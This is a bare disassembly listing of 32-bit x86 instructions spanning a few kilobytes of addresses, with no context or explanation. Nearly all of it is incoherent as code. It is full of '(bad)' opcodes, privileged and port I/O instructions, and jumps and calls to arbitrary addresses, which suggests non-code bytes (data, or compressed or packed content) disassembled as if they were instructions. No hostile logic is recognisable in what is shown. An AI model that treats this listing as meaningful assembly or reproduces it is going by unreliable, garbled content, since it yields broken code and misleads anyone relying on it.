  423ddd:	leave  
  423dde:	rcr    BYTE PTR [ecx+0x50f8e198],cl
  423de4:	psrlq  mm2,QWORD PTR [edx+0x7c16410d]
  423deb:	rol    DWORD PTR [esp+eax*1],cl
  423dee:	enter  0x4a34,0x1c
  423df2:	jnp    0x423ddf
  423df4:	dec    ebp
  423df5:	xchg   ebx,eax
  423df6:	les    esi,FWORD PTR [ecx-0xd54cf68]
  423dfc:	mov    dl,0xa6
  423dfe:	mov    eax,0x5415bfe2
  423e03:	test   BYTE PTR [eax+0x6f],0x93
  423e07:	push   edx
  423e08:	push   eax
  423e09:	jle    0x423e2f
  423e0b:	imul   edi,DWORD PTR [edx],0x30
  423e0e:	inc    ecx
  423e0f:	das    
  423e10:	xor    al,0x1c
  423e12:	hlt    
  423e13:	imul   esp,DWORD PTR [edi],0x975d354c
  423e19:	mov    ah,0x61
  423e1b:	js     0x423e22
  423e1d:	test   eax,0xfb16f584
  423e22:	xchg   ebx,eax
  423e23:	popa   
  423e24:	adc    BYTE PTR [ebx-0x6b],cl
  423e27:	and    al,0x61
  423e29:	add    eax,0x97ce05f7
  423e2e:	mov    esi,0x47af0a55
  423e33:	dec    esi
  423e34:	inc    esi
  423e35:	dec    ecx
  423e36:	mov    ss:0x94797ef9,al
  423e3c:	jnp    0x423dd2
  423e3e:	xor    eax,0xa4a5ad2f
  423e43:	pop    eax
  423e44:	mov    ecx,0x4945a299
  423e49:	lods   eax,DWORD PTR ds:[esi]
  423e4a:	shl    DWORD PTR ds:0xdc7c9e70,cl
  423e50:	mov    cl,0x72
  423e52:	sbb    ah,BYTE PTR [ebx-0x482a485c]
  423e58:	jo     0x423e67
  423e5a:	rcr    esp,1
  423e5c:	fwait
  423e5d:	dec    eax
  423e5e:	add    eax,0xfa30a59d
  423e63:	mov    BYTE PTR [eax+0x29d87767],bl
  423e69:	mov    ecx,DWORD PTR [ebp-0x50]
  423e6c:	mov    eax,ds:0xd0983feb
  423e71:	(bad)  
  423e72:	sub    al,bl
  423e74:	daa    
  423e75:	dec    edx
  423e76:	mov    eax,ds:0xd77b20ac
  423e7b:	bound  edi,QWORD PTR [ebx+ebp*2-0x5d37aa1f]
  423e82:	cwde   
  423e83:	sahf   
	...
  423e90:	add    BYTE PTR [ecx],dh
  423e92:	retf   
  423e93:	xor    BYTE PTR [ebx-0x6],0x7b
  423e97:	icebp  
  423e98:	retf   
  423e99:	aam    0xe9
  423e9b:	imul   esp,ebp,0xffffffe9
  423e9e:	xchg   ebx,eax
  423e9f:	lock mov ds:0x1b673,al
  423ea5:	stos   DWORD PTR es:[edi],eax
  423ea6:	add    eax,DWORD PTR [eax]
  423ea8:	add    dh,cl
  423eaa:	dec    edx
  423eab:	test   eax,0x2ed034
  423eb0:	mov    WORD PTR [ecx+0x6393ce43],ds
  423eb6:	push   esp
  423eb7:	sbb    al,0xf1
  423eb9:	jl     0x423edb
  423ebb:	jne    0x423ecb
  423ebd:	cwde   
  423ebe:	das    
  423ebf:	mov    dh,0x27
  423ec1:	or     DWORD PTR [eax+0x2cde96be],eax
  423ec7:	push   edi
  423ec8:	fdiv   QWORD PTR [ebp+esi*1+0x56]
  423ecc:	add    DWORD PTR [edx-0x5d],eax
  423ecf:	sbb    DWORD PTR [ebx+edi*2],esi
  423ed2:	push   edx
  423ed3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ed4:	(bad)  
  423ed6:	imul   DWORD PTR [ebx+esi*8-0x651eadf2]
  423edd:	clc    
  423ede:	pop    ebp
  423edf:	(bad)  
  423ee0:	retf   0x5d73
  423ee3:	lods   al,BYTE PTR ds:[esi]
  423ee4:	push   ss
  423ee5:	outs   dx,BYTE PTR ds:[esi]
  423ee6:	adc    ebp,DWORD PTR [edi-0x73]
  423ee9:	xchg   esp,eax
  423eea:	test   bl,0x4a
  423eed:	sub    edx,DWORD PTR [esi+0x3cd8592b]
  423ef3:	push   ss
  423ef4:	jno    0x423e83
  423ef6:	jbe    0x423f61
  423ef8:	jno    0x423e7f
  423efa:	(bad)
  423efe:	or     bh,ch
  423f00:	outs   dx,BYTE PTR ds:[esi]
  423f01:	test   DWORD PTR [edx+0x7492c93e],edx
  423f07:	ret    0x8554
  423f0a:	pop    ss
  423f0b:	sub    DWORD PTR [eax],edi
  423f0d:	jbe    0x423f11
  423f0f:	sbb    ah,ch
  423f11:	rcr    DWORD PTR [edx-0x3c7c34dc],1
  423f17:	push   esp
  423f18:	ret    0x4657
  423f1b:	xchg   ebp,eax
  423f1c:	fisubr WORD PTR [ebx]
  423f1e:	test   BYTE PTR [esi+0x5e],cl
  423f21:	jmp    0xd7b20796
  423f26:	mov    es,WORD PTR [ebx]
  423f28:	and    ebx,DWORD PTR [ecx]
  423f2a:	stc    
  423f2b:	sub    DWORD PTR [eax-0x6936e53c],ebx
  423f31:	dec    edx
  423f32:	das    
  423f33:	int    0x82
  423f35:	call   0x73b:0x7ea5fcc1
  423f3c:	ins    BYTE PTR es:[edi],dx
  423f3d:	and    ebx,DWORD PTR [ebx+esi*1]
  423f40:	adc    BYTE PTR [ecx-0x5cad63a],dl
  423f46:	push   ecx
  423f47:	out    0x6d,al
  423f49:	mov    al,0xe
  423f4b:	cli    
  423f4c:	jne    0x423f01
  423f4e:	out    0x39,al
  423f50:	(bad)  
  423f51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423f52:	sub    ecx,esp
  423f54:	bound  edx,QWORD PTR [eax]
  423f56:	fs dec edx
  423f58:	ds js  0x423f12
  423f5b:	cmp    dl,BYTE PTR [ecx]
  423f5d:	fild   DWORD PTR [esi+edi*2+0x70]
  423f61:	lds    edx,FWORD PTR [edi+esi*2-0x2d]
  423f65:	cld    
  423f66:	mov    esp,0xbc20c818
  423f6b:	out    dx,al
  423f6c:	test   BYTE PTR [edi+0x4087ece4],ch
  423f72:	push   esi
  423f73:	add    ecx,DWORD PTR [ecx-0x2c]
  423f76:	call   0x33a:0x46c88eed
  423f7d:	ja     0x423f1c
  423f7f:	xchg   esp,eax
  423f80:	mov    ecx,0xdbdc7b98
  423f85:	jno    0x423f9e
  423f87:	dec    eax
  423f88:	push   ecx
  423f89:	jmp    0x1d21f23f
  423f8e:	xchg   ecx,ecx
  423f90:	push   0xffffffd4
  423f92:	jecxz  0x423f70
  423f94:	stos   BYTE PTR es:[edi],al
  423f95:	mov    edi,0x4fe23dc5
  423f9a:	pushf  
  423f9b:	cli    
  423f9c:	or     ebp,DWORD PTR [eax-0x75]
  423f9f:	in     eax,dx
  423fa0:	mov    esp,0x52f9092a
  423fa5:	(bad)  
  423fa6:	adc    al,0x1a
  423fa8:	outs   dx,DWORD PTR ds:[esi]
  423fa9:	xchg   esi,eax
  423faa:	call   0x3a9a326f
  423faf:	cmc    
  423fb0:	inc    esp
  423fb1:	lds    esi,FWORD PTR es:[ecx-0x31ad6588]
  423fb8:	xor    edi,esi
  423fba:	pop    ss
  423fbb:	(bad)  
  423fbc:	scas   al,BYTE PTR es:[edi]
  423fbd:	or     eax,0x64e316b1
  423fc2:	inc    ecx
  423fc3:	pop    es
  423fc4:	pushf  
  423fc5:	out    dx,eax
  423fc6:	mov    ch,0xab
  423fc8:	xchg   edx,eax
  423fc9:	dec    ebp
  423fca:	das    
  423fcb:	cmp    al,0xa6
  423fcd:	dec    esi
  423fce:	mov    eax,esp
  423fd0:	sub    eax,0x71b37cd7
  423fd5:	or     DWORD PTR [ebx+0x10a0129e],ebx
  423fdb:	shr    bl,cl
  423fdd:	jbe    0x423fb9
  423fdf:	fwait
  423fe0:	stos   BYTE PTR es:[edi],al
  423fe1:	repz fs in eax,0xad
  423fe5:	ins    BYTE PTR es:[edi],dx
  423fe6:	test   BYTE PTR [edi],ch
  423fe8:	cmp    eax,0x13cafe4
  423fed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423fee:	sbb    edx,DWORD PTR [ebx+0x68]
  423ff1:	(bad)  [edi+0x221554a9]
  423ff7:	jg     0x423fb1
  423ff9:	sar    DWORD PTR [ecx],0xcc
  423ffc:	popa   
  423ffd:	scas   eax,DWORD PTR es:[edi]
  423ffe:	xchg   DWORD PTR [ecx-0x145c6b21],esp
  424004:	nop
  424005:	(bad)  
  424006:	out    dx,eax
  424007:	pop    ecx
  424008:	push   ebp
  424009:	cmc    
  42400a:	pop    eax
  42400b:	(bad)  
  42400d:	push   esp
  42400e:	sbb    bl,BYTE PTR [esi+0x45d4d998]
  424014:	and    eax,0xd1ba59f6
  424019:	cmp    DWORD PTR [ecx+ebx*8-0x4d],0xf25ec28d
  424021:	daa    
  424022:	xchg   esi,eax
  424023:	dec    ebp
  424024:	les    ebp,FWORD PTR [ebp-0x5d58e5cd]
  42402a:	dec    ecx
  42402b:	repnz push 0x8f449e87
  424031:	xchg   ebp,eax
  424032:	aas    
  424033:	sub    al,0xe6
  424035:	push   ebx
  424036:	jno    0x42404d
  424038:	and    BYTE PTR [esi+0xa],ah
  42403b:	test   DWORD PTR [edx+edi*2-0x2d31eac8],0x72cb74b4
  424046:	jp     0x423fef
  424048:	xchg   BYTE PTR [ebx],bl
  42404a:	add    BYTE PTR [ecx+0x65],dl
  42404d:	fnstenv [ebp-0x2f]
  424050:	mov    WORD PTR cs:[edi],?
  424053:	xchg   esi,eax
  424054:	sub    DWORD PTR [edx+eax*2],eax
  424057:	test   DWORD PTR [ebx-0x4b],edi
  42405a:	mov    ds:0x3cea24eb,al
  42405f:	pop    ebx
  424060:	dec    edx
  424061:	dec    edi
  424062:	push   es
  424063:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424064:	mov    ds:0x8c6ff07a,al
  424069:	pop    ecx
  42406a:	jnp    0x4240cf
  42406c:	push   ds
  42406d:	ja     0x423ffe
  42406f:	rcr    DWORD PTR [ebx+0x202d1239],1
  424075:	gs add al,0xe5
  424078:	popf   
  424079:	dec    eax
  42407a:	mov    al,0x8f
  42407c:	and    edx,0xffffffe7
  42407f:	mov    edx,0x5bd39618
  424084:	ins    DWORD PTR es:[edi],dx
  424085:	push   eax
  424086:	dec    ebx
  424087:	mov    ah,0x38
  424089:	jmp    0x2066:0x629fa88b
  424090:	inc    ecx
  424091:	jmp    0x42405d
  424093:	lods   al,BYTE PTR ds:[esi]
  424094:	mov    edx,0xbd64b834
  424099:	mov    ah,0x76
  42409b:	dec    esi
  42409c:	mov    dh,0x1c
  42409e:	and    BYTE PTR [edx-0x6e6bc770],dl
  4240a4:	dec    edi
  4240a5:	sub    BYTE PTR ds:0xeddc478b,0x94
  4240ac:	inc    esp
  4240ad:	jle    0x4240c1
  4240af:	neg    BYTE PTR [esi]
  4240b1:	xchg   esi,eax
  4240b2:	outs   dx,DWORD PTR ds:[esi]
  4240b3:	fld    DWORD PTR [ecx]
  4240b5:	icebp  
  4240b6:	or     BYTE PTR [eax],ah
  4240b8:	mov    ds:0x110ac84b,al
  4240bd:	dec    esp
  4240be:	jle    0x4240b9
  4240c0:	loopne 0x4240f0
  4240c2:	test   BYTE PTR gs:[eax],bl
  4240c5:	inc    ebp
  4240c6:	shl    BYTE PTR [edi-0x64],cl
  4240c9:	jl     0x424121
  4240cb:	and    edi,DWORD PTR [ebp-0x19e879b4]
  4240d1:	sar    BYTE PTR [esi],1
  4240d3:	test   edi,ebx
  4240d5:	mov    dl,0x7c
  4240d7:	pushf  
  4240d8:	in     eax,0x4c
  4240da:	sahf   
  4240db:	ret    
  4240dc:	fs mov ecx,0x7ed4fda5
  4240e2:	cdq    
  4240e3:	inc    esi
  4240e4:	dec    eax
  4240e5:	ss icebp 
  4240e7:	retf   0x662d
  4240ea:	jno    0x42414b
  4240ec:	push   ss
  4240ed:	fwait
  4240ee:	daa    
  4240ef:	fmul   QWORD PTR [esi+0x69]
  4240f2:	repnz xchg edx,eax
  4240f4:	hlt    
  4240f5:	mov    esi,0x99fdf2ef
  4240fa:	lahf   
  4240fb:	(bad)  
  4240fc:	repnz in eax,0xa7
  4240ff:	ja     0x424101
  424101:	xchg   BYTE PTR ds:0x28254671,al
  424107:	fst    DWORD PTR fs:[esi-0x1b]
  42410b:	pop    es
  42410c:	sub    bh,BYTE PTR [eax-0x54bc125b]
  424112:	add    eax,DWORD PTR [ebp-0x72]
  424115:	sbb    eax,0xbf2e35b1
  42411a:	add    eax,esp
  42411c:	add    dl,BYTE PTR [esi+edi*2-0x543dc7c1]
  424123:	mov    dh,0x88
  424125:	mov    DWORD PTR [edi+0x5f],esi
  424128:	rcr    BYTE PTR [edi+0xd4c8d2c],1
  42412e:	arpl   WORD PTR [edx+0x4f],si
  424131:	fstp   QWORD PTR [ebp+0x6]
  424134:	cli    
  424135:	add    DWORD PTR [ebp-0x700a09bc],esp
  42413b:	out    dx,al
  42413c:	jno    0x424119
  42413e:	repnz dec esp
  424140:	and    DWORD PTR [edx],edx
  424142:	sub    ebx,esi
  424144:	fs (bad) 
  424147:	mov    ds:0x3e7ec788,al
  42414c:	outs   dx,DWORD PTR ds:[esi]
  42414d:	retf   0x3907
  424150:	dec    eax
  424151:	or     al,0x58
  424153:	mov    dl,0x42
  424155:	push   ebp
  424156:	js     0x424128
  424158:	push   edx
  424159:	mov    al,al
  42415b:	pop    es
  42415c:	das    
  42415d:	call   0x637473a5
  424162:	pusha  
  424163:	stc    
  424164:	loopne 0x4241e5
  424166:	sar    edi,1
  424168:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424169:	dec    edi
  42416a:	jnp    0x42410f
  42416c:	rol    BYTE PTR [edi],1
  42416e:	adc    DWORD PTR [ecx+0x7d],0xc
  424172:	dec    ebp
  424173:	inc    edx
  424174:	or     al,0x68
  424176:	adc    eax,0x9e6b59fc
  42417b:	hlt    
  42417c:	mov    al,ds:0xf9493780
  424181:	push   edi
  424182:	popf   
  424183:	loope  0x4241b8
  424185:	out    dx,eax
  424186:	fs sbb ah,ah
  424189:	mov    esi,0x944eca29
  42418e:	ror    edi,0xcc
  424191:	sbb    BYTE PTR [edx+0x41a33a9f],al
  424197:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424198:	push   cs
  424199:	sbb    esp,DWORD PTR [ecx-0x3bf186b7]
  42419f:	into   
  4241a0:	int3   
  4241a1:	sub    BYTE PTR [edi],dh
  4241a3:	fs fsub st(4),st
  4241a6:	cmp    eax,DWORD PTR [esi]
  4241a8:	cs std 
  4241aa:	cmp    dl,BYTE PTR [esi+0x32]
  4241ad:	(bad)  
  4241ae:	inc    esp
  4241af:	jle    0x424223
  4241b1:	and    BYTE PTR [esi+0x43],ch
  4241b4:	xor    bl,BYTE PTR [ecx-0x26]
  4241b7:	xor    eax,0x2a212d43
  4241bc:	xchg   esi,eax
  4241bd:	or     DWORD PTR [esi],ebx
  4241bf:	cld    
  4241c0:	lea    edi,[edx-0x6d]
  4241c3:	stos   BYTE PTR es:[edi],al
  4241c4:	aam    0x8a
  4241c6:	jbe    0x4241c7
  4241c8:	mov    al,0xc3
  4241ca:	xchg   dh,ch
  4241cc:	xor    DWORD PTR [eax],edx
  4241ce:	retf   0xb818
  4241d1:	lds    esi,FWORD PTR [esi+0x15]
  4241d4:	xor    al,0x59
  4241d6:	(bad)  
  4241d7:	ja     0x424163
  4241d9:	pop    es
  4241da:	jmp    0x424189
  4241dc:	mov    al,ds:0x9c236d45
  4241e1:	(bad)  
  4241e2:	mov    edi,0x3514682a
  4241e7:	repz jbe 0x4241ee
  4241ea:	pop    ds
  4241eb:	and    BYTE PTR [eax-0x1f],dh
  4241ee:	call   0xb8a1672e
  4241f3:	out    dx,al
  4241f4:	(bad)  
  4241f6:	xor    DWORD PTR [ebx-0x171f6c60],edi
  4241fc:	ret    0x3d74
  4241ff:	xor    eax,0xe1265f41
  424204:	loope  0x424210
  424206:	inc    esi
  424207:	jge    0x4241fc
  424209:	jge    0x424224
  42420b:	mov    bh,0xa3
  42420d:	xchg   esi,eax
  42420e:	pop    esi
  42420f:	lods   al,BYTE PTR ds:[esi]
  424210:	test   al,0x28
  424212:	jmp    0xb80038a6
  424217:	int    0xf8
  424219:	push   ecx
  42421a:	and    DWORD PTR [edx-0x60],ebp
  42421d:	out    0xc9,eax
  42421f:	ins    BYTE PTR es:[edi],dx
  424220:	add    eax,0x4d59842e
  424225:	jne    0x42429c
  424227:	(bad)  
  424228:	cs xchg ebx,eax
  42422a:	mov    ds:0x437b0871,eax
  42422f:	lds    ecx,FWORD PTR [esi]
  424231:	repnz and DWORD PTR [ebp+0x786956c0],esp
  424238:	ins    BYTE PTR es:[edi],dx
  424239:	xor    BYTE PTR [edi],bl
  42423b:	add    DWORD PTR [esi-0x202393fa],edi
  424241:	sbb    ecx,edx
  424243:	pop    esi
  424244:	jne    0x424249
  424246:	rol    DWORD PTR [edi+0x26f7790f],1
  42424c:	adc    DWORD PTR [edx],ecx
  42424e:	xchg   ebx,eax
  42424f:	sbb    bh,bh
  424251:	pop    ebx
  424252:	mov    al,0xb5
	...
  424260:	add    bh,dh
  424262:	in     eax,0x9f
  424264:	jp     0x424205
  424266:	jp     0x42425f
  424268:	in     eax,dx
  424269:	sar    DWORD PTR [edi+0x1006212c],1
  42426f:	imul   ecx,DWORD PTR [esi+ebx*1],0xab0001ba
  424276:	add    eax,DWORD PTR [eax]
  424278:	add    BYTE PTR [ebx+0x69eeba9c],bl
  42427e:	ja     0x424255
  424280:	push   es
  424281:	imul   esp,DWORD PTR [ebx-0x2598d412],0xa
  424288:	aam    0xa5
  42428a:	aaa    
  42428b:	pop    esp
  42428c:	or     DWORD PTR [ebp-0x25939740],esp
  424292:	in     eax,dx
  424293:	outs   dx,BYTE PTR ds:[esi]
  424294:	imul   ecx,eax,0xacee113c
  42429a:	xchg   ebp,eax
  42429b:	jge    0x4242ba
  42429d:	sbb    DWORD PTR [esi-0x2e5a9744],ebx
  4242a3:	stos   DWORD PTR es:[edi],eax
  4242a4:	adc    eax,0x25c8031e
  4242a9:	test   al,0x26
  4242ab:	mov    ch,0xdf
  4242ad:	mov    ds:0x99da47a,al
  4242b2:	(bad)  
  4242b3:	pushf  
  4242b4:	shr    DWORD PTR [ebx+0x79],0xa8
  4242b8:	inc    esp
  4242b9:	xor    eax,0xece6a200
  4242be:	clc    
  4242bf:	stos   BYTE PTR es:[edi],al
  4242c0:	dec    ecx
  4242c1:	inc    esp
  4242c2:	ins    BYTE PTR es:[edi],dx
  4242c3:	lock lahf 
  4242c5:	xchg   ebx,eax
  4242c6:	in     al,dx
  4242c7:	stc    
  4242c8:	mov    edx,DWORD PTR [ecx]
  4242ca:	ss hlt 
  4242cc:	sub    eax,0x2904d0e4
  4242d1:	in     eax,0xe8
  4242d3:	mov    eax,0x9a0f2b
  4242d8:	mov    ecx,0xe36307c6
  4242dd:	pop    ebp
  4242de:	fild   QWORD PTR [edi-0x63]
  4242e1:	xchg   DWORD PTR [edi-0x3f],ebp
  4242e4:	test   eax,0x21d9ec6d
  4242e9:	les    ecx,FWORD PTR [ecx-0x655138d3]
  4242ef:	je     0x4242b1
  4242f1:	test   BYTE PTR [eax+0x33c191b],ch
  4242f7:	mov    esi,0xba710584
  4242fc:	jnp    0x4242f8
  4242fe:	jmp    0x37b654d2
  424303:	daa    
  424304:	pop    edi
  424305:	pop    ecx
  424306:	mov    ah,0xd7
  424308:	rcl    edx,cl
  42430a:	or     eax,0x5794ee6d
  42430f:	push   ecx
  424310:	into   
  424311:	sbb    BYTE PTR [esi+0x79],ch
  424314:	in     al,0x4c
  424316:	cs addr16 pop ss
  424319:	retf   
  42431a:	jle    0x4242cb
  42431c:	push   DWORD PTR [ebx+0x28]
  42431f:	push   cs
  424320:	ss repnz mov ebx,0x62d58f55
  424327:	cmc    
  424328:	shl    BYTE PTR [ebx+eiz*4-0xa],cl
  42432c:	scas   eax,DWORD PTR es:[edi]
  42432d:	cdq    
  42432e:	mov    bh,0x82
  424330:	sub    eax,0x80665c9f
  424335:	test   DWORD PTR [esi+0x569d084e],ebp
  42433b:	sub    BYTE PTR ds:[ecx-0x4084b1d1],ah
  424342:	sub    DWORD PTR [esi],ebp
  424344:	ds inc ecx
  424346:	hlt    
  424347:	fs into 
  424349:	push   edx
  42434a:	mov    ds:0x3321519e,al
  42434f:	enter  0xc3c4,0x3a
  424353:	xchg   ebp,eax
  424354:	mov    eax,0x8c17dc96
  424359:	jg     0x4243c0
  42435b:	xchg   esp,eax
  42435c:	sub    esp,0x2cc6795f
  424362:	lock pop edi
  424364:	ror    BYTE PTR [edx+esi*4-0x4b6f7e30],cl
  42436b:	mov    ecx,0x8d9b02b1
  424370:	dec    ecx
  424371:	cwde   
  424372:	mov    ebp,0x667032a8
  424377:	push   ss
  424378:	push   eax
  424379:	and    eax,0x62c36f9d
  42437e:	push   eax
  42437f:	jl     0x4243cd
  424381:	xor    al,0x3
  424383:	mov    eax,ds:0x3857984e
  424388:	inc    esp
  424389:	and    al,0x2f
  42438b:	mov    ecx,0xc3b2582c
  424390:	inc    ecx
  424391:	loope  0x424342
  424393:	es push 0xf486472f
  424399:	aaa    
  42439a:	sar    BYTE PTR [esi+ebx*4+0x74],1
  42439e:	pop    esp
  42439f:	adc    bl,BYTE PTR [edx-0x571c746d]
  4243a5:	xchg   ecx,eax
  4243a6:	enter  0x5450,0x0
  4243aa:	fwait
  4243ab:	cld    
  4243ac:	pop    eax
  4243ad:	stos   BYTE PTR es:[edi],al
  4243ae:	jge    0x4243db
  4243b0:	dec    edi
  4243b1:	add    ebp,DWORD PTR [ebx-0x3baeba7d]
  4243b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4243b8:	xlat   BYTE PTR ds:[ebx]
  4243b9:	test   BYTE PTR [esi],ch
  4243bb:	int3   
  4243bc:	or     ch,BYTE PTR ds:0x1216d113
  4243c2:	add    ah,BYTE PTR [edx+0x7f]
  4243c5:	push   0xffffffd9
  4243c7:	pop    ebp
  4243c8:	out    0x9f,al
  4243ca:	sti    
  4243cb:	adc    edi,DWORD PTR [ecx]
  4243cd:	and    dh,BYTE PTR [edx+0x60425909]
  4243d3:	cmp    DWORD PTR [edi+0x7c8fc590],eax
  4243d9:	push   ss
  4243da:	mov    esp,0x3c22107d
  4243df:	scas   al,BYTE PTR es:[edi]
  4243e0:	xchg   edx,eax
  4243e1:	sti    
  4243e2:	fcom   DWORD PTR ds:0x5bfe49e2
  4243e8:	dec    esi
  4243e9:	xchg   ecx,eax
  4243ea:	pop    eax
  4243eb:	sbb    bh,ch
  4243ed:	sti    
  4243ee:	fcmove st,st(5)
  4243f0:	sbb    DWORD PTR [ebx-0x57fe289e],edi
  4243f6:	mov    bl,0x2f
  4243f8:	or     BYTE PTR [ebx-0x54525a69],ah
  4243fe:	mov    al,0x4
  424400:	dec    esp
  424401:	or     al,0xe8
  424403:	int    0x68
  424405:	cmp    eax,0x7106dec0
  42440a:	inc    ebp
  42440b:	mov    ds:0x1c24c25b,al
  424410:	xor    BYTE PTR [edx+0x1651d4f8],0x94
  424417:	ins    DWORD PTR es:[edi],dx
  424418:	and    al,0x9c
  42441a:	or     dh,cl
  42441c:	loope  0x424491
  42441e:	fdivp  st(7),st
  424420:	adc    DWORD PTR [ecx],ebx
  424422:	cmp    al,0x73
  424424:	push   ss
  424425:	icebp  
  424426:	jae    0x4243b6
  424428:	mov    cl,0xf6
  42442a:	dec    esp
  42442b:	sub    ch,BYTE PTR [ebx+0x2bc2ab52]
  424431:	xor    edx,DWORD PTR [ebx+0x59477c6a]
  424437:	mov    ecx,DWORD PTR [edx]
  424439:	aad    0x46
  42443b:	mov    cl,0x16
  42443d:	(bad)  
  42443e:	std    
  42443f:	cmp    al,0x8a
  424441:	push   esi
  424442:	fsubp  st(4),st
  424444:	call   DWORD PTR [edi-0x1fb4a6d0]
  42444a:	cwde   
  42444b:	pop    esi
  42444c:	xchg   BYTE PTR [edi*2-0x78c056e3],dl
  424453:	mov    ds:0xefdd60f2,al
  424458:	test   DWORD PTR fs:[ebp-0x6758fdab],ebx
  42445f:	shl    ch,1
  424461:	mov    eax,ds:0xabeb3b7c
  424466:	push   0x4c8e1ad6
  42446b:	gs push ebx
  42446d:	mov    al,ds:0x1b841ddd
  424472:	fs inc esp
  424474:	in     eax,0xeb
  424476:	ja     0x4244ee
  424478:	add    dl,BYTE PTR [eax+0x35]
  42447b:	xchg   ebx,eax
  42447c:	popa   
  42447d:	jle    0x424494
  42447f:	ret    0x8920
  424482:	leave  
  424483:	lods   al,BYTE PTR ds:[esi]
  424484:	arpl   bp,di
  424486:	cmc    
  424487:	int    0x94
  424489:	adc    DWORD PTR [ebp-0x4835c40f],ebx
  42448f:	scas   eax,DWORD PTR es:[edi]
  424490:	pop    ds
  424491:	test   eax,0x5cf7432
  424496:	xchg   ecx,eax
  424497:	sub    edi,DWORD PTR [eax]
  424499:	test   eax,0xc29c7871
  42449e:	js     0x424501
  4244a0:	jge    0x42450a
  4244a2:	rcr    edi,1
  4244a4:	pop    eax
  4244a5:	js     0x424517
  4244a7:	shl    DWORD PTR [edx-0x72a3aab4],1
  4244ad:	or     bh,BYTE PTR [esp+ebp*1]
  4244b0:	fs mov ch,0x33
  4244b3:	pop    ebx
  4244b4:	or     ch,BYTE PTR [esi]
  4244b6:	sti    
  4244b7:	xchg   ebp,eax
  4244b8:	test   dl,ch
  4244ba:	(bad)  
  4244bb:	xchg   edi,eax
  4244bc:	ficom  WORD PTR [edx]
  4244be:	dec    ebx
  4244bf:	ins    DWORD PTR es:[edi],dx
  4244c0:	cdq    
  4244c1:	cwde   
  4244c2:	int3   
  4244c3:	push   ss
  4244c4:	rcr    BYTE PTR [edi-0x22],0xee
  4244c8:	add    ebp,edi
  4244ca:	jmp    0x42447b
  4244cc:	lods   eax,DWORD PTR ds:[esi]
  4244cd:	imul   esp,DWORD PTR [edi+0x8aa96c4],0xffffff9e
  4244d4:	pop    ds
  4244d5:	rol    DWORD PTR [edx],cl
  4244d7:	ds aam 0x3a
  4244da:	lea    esi,[ecx+0x3f]
  4244dd:	pop    ds
  4244de:	ja     0x4244a2
  4244e0:	cld    
  4244e1:	pushf  
  4244e2:	popa   
  4244e3:	ja     0x424553
  4244e5:	outs   dx,BYTE PTR ds:[esi]
  4244e6:	sti    
  4244e7:	mov    ch,ah
  4244e9:	inc    ebp
  4244ea:	mov    esi,0x85cec5a1
  4244ef:	jl     0x4244ae
  4244f1:	sub    DWORD PTR [ebx],edi
  4244f3:	cmp    BYTE PTR [eax-0x7e6140b0],bl
  4244f9:	(bad)  
  4244fc:	fdivr  QWORD PTR [edi-0x17b64367]
  424502:	inc    ebp
  424503:	or     ecx,eax
  424505:	jp     0x4244b4
  424507:	mov    ecx,0xfaf80bd3
  42450c:	cli    
  42450d:	push   eax
  42450e:	dec    eax
  42450f:	jg     0x42452c
  424511:	loop   0x4244db
  424513:	cmp    BYTE PTR [esi+0x7bad849d],bh
  424519:	sub    DWORD PTR [ebx],edi
  42451b:	fbld   TBYTE PTR [eax]
  42451d:	(bad)  
  42451f:	pop    edi
  424520:	out    dx,al
  424521:	scas   al,BYTE PTR es:[edi]
  424522:	dec    ebx
  424523:	rcr    esp,cl
  424525:	sub    eax,edi
  424527:	test   eax,0x70e013bc
  42452c:	jp     0x424515
  42452e:	inc    ecx
  42452f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424530:	pushf  
  424531:	vpunpckhdq xmm4,xmm3,XMMWORD PTR [edi]
  424535:	sub    eax,0xd9488c47
  42453a:	sahf   
  42453b:	lea    edx,[ecx-0x5d]
  42453e:	jne    0x4245a1
  424540:	push   esi
  424541:	nop
  424542:	loope  0x424585
  424544:	push   edi
  424545:	sar    DWORD PTR [edi+0x2f],1
  424548:	jmp    0x42455a
  42454a:	loop   0x42452c
  42454c:	daa    
  42454d:	adc    BYTE PTR [esp+esi*4+0x53284452],bl
  424554:	icebp  
  424555:	je     0x42455e
  424557:	push   eax
  424558:	shr    DWORD PTR [edx*1-0x460130a4],0xc8
  424560:	dec    eax
  424561:	add    eax,0x870e3166
  424566:	cdq    
  424567:	lods   eax,DWORD PTR ds:[esi]
  424568:	push   ecx
  424569:	jns    0x42450d
  42456b:	push   ss
  42456c:	push   edi
  42456e:	inc    edx
  42456f:	fstp   TBYTE PTR [edi-0x41]
  424572:	(bad)  
  424573:	fwait
  424574:	push   ecx
  424575:	mov    eax,ds:0x1b6cabb5
  42457a:	rcl    DWORD PTR [esi+0x78],1
  42457d:	jge    0x4245db
  42457f:	shl    DWORD PTR [edx+0x6f],cl
  424582:	icebp  
  424583:	test   al,0x32
  424585:	lea    esi,[edx]
  424587:	and    DWORD PTR [eax-0x35e921c5],edi
  42458d:	imul   ebx,DWORD PTR [edi],0x41
  424590:	adc    al,0x22
  424592:	mov    bl,0xf6
  424594:	(bad)  
  424595:	cmp    ecx,ebp
  424597:	aaa    
  424598:	leave  
  424599:	add    ch,bl
  42459b:	sbb    dl,ah
  42459d:	dec    ebp
  42459e:	jg     0x424527
  4245a0:	lods   al,BYTE PTR ds:[esi]
  4245a1:	cmc    
  4245a2:	sbb    BYTE PTR [ebx-0x267cd3f0],dh
  4245a8:	adc    al,0xbd
  4245aa:	pop    edx
  4245ab:	xor    al,0xb0
  4245ad:	jmp    0xad39:0xc0bcfaff
  4245b4:	jb     0x4245fe
  4245b6:	xchg   ebp,eax
  4245b7:	aas    
  4245b8:	mov    bh,0x89
  4245ba:	sar    DWORD PTR [esi+0x44cc5c6d],1
  4245c0:	dec    ebx
  4245c1:	mov    dl,0x28
  4245c3:	icebp  
  4245c4:	(bad)  
  4245c5:	(bad)  
  4245c7:	adc    al,bl
  4245c9:	adc    esp,edi
  4245cb:	xor    DWORD PTR [esi-0x5e78f9ee],edi
  4245d1:	inc    ecx
